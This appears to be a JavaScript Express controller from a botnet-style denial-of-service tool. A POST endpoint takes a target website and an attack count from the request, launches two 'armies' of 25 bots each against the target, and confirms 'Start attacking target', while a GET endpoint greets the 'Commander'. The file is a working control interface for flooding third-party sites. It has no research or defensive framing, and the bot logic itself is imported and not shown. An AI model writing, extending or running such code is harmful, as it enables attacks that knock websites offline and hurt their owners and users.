const armyBot = require('../utils/army')

class ControlControllers {

    // [GET] /
    index(req ,res, next) {
        res.status(200).json({
            status: 'Access Successfully',
            message: 'Welcome come back! Commander'
        })
    }

    // [POST] /
    async attackCommand(req, res, next) {
        try {
           const {websiteTarget, numberDos} = req.body
           
            await Promise.all([
               armyBot.createArmy(websiteTarget, 25, numberDos),
               armyBot.createArmy(websiteTarget, 25, numberDos),
            ])
            res.status(200).send('OK! Start attacking target...')
            
        } catch (error) {
            console.log(error);
            res.status(500).send('Something wrong!')
        }
    }

}

module.exports = new ControlControllers